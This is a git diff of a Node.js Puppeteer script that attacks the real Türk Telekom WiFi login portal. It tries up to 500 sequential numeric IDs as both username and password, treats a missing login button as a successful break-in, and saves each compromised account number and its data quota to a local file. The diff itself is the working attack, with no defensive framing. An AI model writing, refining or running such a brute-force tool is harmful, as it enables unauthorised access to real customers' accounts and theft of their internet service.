@@ -1,17 +1,19 @@
-const puppeteer = require('puppeteer');
+const puppeteer = require("puppeteer");
+const fs = require("fs");
 
 // skips first two numbers
-var user = 2110370;
+var user = 2112220;
 var howManyTrys = 500;
 
 var accountFound = false;
-const url = "https://giris.turktelekomwifi.com/#/login/adsl";
+const url = "https://giris.turktelekomwifi.com/#/";
+const url2 = "https://giris.turktelekomwifi.com/#/login/adsl";
 
 const TTMusteri_Button = "#accordingMenuButton";
 const Internet_Button = "#according-menu > button:nth-child(1)";
 const InternetGiris_Button = "#adslBtn";
 
-const checkBox = 'input[name="termsCheckBox"]';
+const checkBoxID = 'input[name="termsCheckBox"]';
 const userName_InputField = "#adslUsername";
 const password_InputField = 'input[name="password"]';
 const login_Button = "#loginBtn:not([disabled])";
@@ -25,15 +27,17 @@ async function findInternet(){
 
 	while (howManyTrys !== 0) {
 
-        try {
-            await fillForm(page);	
-        } catch (error) {
-            await exitAccount(page);
-        }
-	
-		await showQuota(page);
-        await navigateSite(page);
+		await navigateSite(page);
+
+        await fillForm(page);	
+
+        await exitAccount(page);
+
+        await showQuota(page);
 	}
+	
+	console.log("Proccess complete\nExiting")
+	await browser.close();
 }
 
 async function startBrowser(){
@@ -41,7 +45,6 @@ async function startBrowser(){
 	const browser = await puppeteer.launch({
 		headless: true,
 		defaultViewport: null
-		//slowMo: 100 //slow down every action by 100ms 
 	});
 
 	const _page = await browser.newPage();
@@ -54,27 +57,57 @@ async function startBrowser(){
 
 
 async function navigateSite(page){
-
+	console.log("navigating");
 	await page.waitForSelector(TTMusteri_Button);
 	await page.click(TTMusteri_Button);
 
 	await page.waitForSelector(Internet_Button);
 	await page.click(Internet_Button);
 
+
 	await page.waitForSelector(InternetGiris_Button);
-	await page.click(InternetGiris_Button);
+	await Promise.all([
+		page.waitForNavigation(),
+		await page.click(InternetGiris_Button)
+	])
+
+
+
+/* 	await page.waitForSelector(InternetGiris_Button);
+	await page.click(InternetGiris_Button); */
+
+
+
+/*     await page.waitForSelector(checkBoxID);
+    const checkbox = await page.$(checkBoxID);
+    var checked = await (await checkbox.getProperty('checked')).jsonValue();
+	if (!checked){
+		await page.click(checkBoxID);
+	} */
+	await console.log("navigating complete");
+
 }
 
 async function fillForm(page){
 
-	await page.waitForSelector(checkBox);
-	await page.click(checkBox);
+    console.log("started fillForm")
 
+	//console.log(checked);
+	await page.waitForSelector(checkBoxID);
+	const checkbox = await page.$(checkBoxID);
+	var checked = await (await checkbox.getProperty('checked')).jsonValue();
+
+	if (!checked){
+		await page.click(checkBoxID);
+	}
+	
+	console.log("entering loop");
 	while (!accountFound && (howManyTrys !== 0)) {
 
 		howManyTrys -= 1;
 		user += 1;
         console.log(user);
+		
 
 	    // clear input field
 		async function clear(page, selector) {
@@ -92,30 +125,45 @@ async function fillForm(page){
 		await page.type(userName_InputField, user.toString());
 		await page.type(password_InputField, user.toString());		
 
-		await page.waitForSelector(login_Button, {timeout:4000});
-		await page.click(login_Button);
+        try {
+            await page.waitForSelector(login_Button,{timeout:15000});
+            await page.click(login_Button);
+        } catch (error) {
+			console.log("account found!");
+            fs.appendFile(`${__dirname}\\Accounts.txt`, `\n${user}`, err => {})
+            accountFound = true;
+        }
+        
 	}
-
+    console.log("exited while loop");
 }
 
 async function exitAccount(page){
-
-	await page.waitForSelector(exitButton);
-	page.click(exitButton);
+    console.log("exiting from account")
+    //await setTimeout(() => {},3000);
+	try {
+		await page.waitForSelector(exitButton,{timeout:5000});
+		page.click(exitButton);
+	} catch (error) {
+		console.log("couldn't find exit button");
+		//await page.goto(url);
+	}
 
 	accountFound = false;
-    await setTimeout(() => {console.log("exiting")},2000);
-    //await page.goto(url);
+    console.log("exit complete")
 }
 
 async function showQuota(page) {
 
+    console.log("showing quota")
 	await page.waitForSelector(tableContent);
-    const table = await page.evaluate(async() => {
-        const tds = Array.from(document.querySelectorAll("td.alert-link"))
+    var table = await page.evaluate(async() => {
+        let tds = Array.from(document.querySelectorAll("td.alert-link"))
         return tds.map(td => td.innerText)
     });
     console.log(table);
+    fs.appendFile(`${__dirname}\\Accounts.txt`, `\n${table}`, err => {})
+    console.log("show quota done")
 }
 
 findInternet();
